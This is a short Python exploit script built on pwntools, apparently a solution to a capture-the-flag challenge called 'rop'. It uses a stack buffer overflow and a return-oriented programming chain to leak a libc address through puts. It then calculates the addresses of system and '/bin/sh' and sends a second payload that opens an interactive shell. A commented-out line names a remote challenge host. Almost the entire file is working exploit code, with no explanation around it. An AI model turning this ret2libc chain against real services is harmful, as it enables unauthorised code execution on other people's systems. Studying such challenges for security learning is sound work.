from pwn import *

binary = ELF("rop")

context.binary = binary



libc = ELF("libc6_2.27-3ubuntu1_amd64.so")
env = {'LD_PRELOAD':'./libc6_2.27-3ubuntu1_amd64.so'}

#io = remote ("13.233.58.220",3333)
io = binary.process(env=env)

pop_rdi = 0x0000000000401273 # pop rdi ; ret
pop_rsi = 0x0000000000401271 #  pop rsi ; pop r15 ; ret

#gdb.attach(io)
puts_got = 0x00404018
puts_plt = 0x00401030
main = 0x004011bd


payload = "A" * 24
payload += flat([
     pop_rdi,
    puts_got,
    puts_plt,
    main
])

io.recvuntil("Can you rop your way to shell ?\n\n")
io.sendline(payload)

libc_leak = u64(io.recvline()[:-1].ljust(0x8,"\x00"))
libc_base = libc_leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
sh = libc_base + next(libc.search('/bin/sh'))
log.info("puts Leak : " + hex(libc_leak))
log.info("Libc Leak : " + hex(libc_base))
log.info("System @ : " + hex(system))
log.info("Sh @ : " + hex(sh))

payload = "A" * 24

#payload+=p64(libc_base+0x10a38c)
payload += flat([
   pop_rsi,p64(0x0),p64(0x0),
   pop_rdi,
  sh,
  system,
  ])


io.recvuntil("Can you rop your way to shell ?\n\n")
io.sendline(payload)
io.interactive()
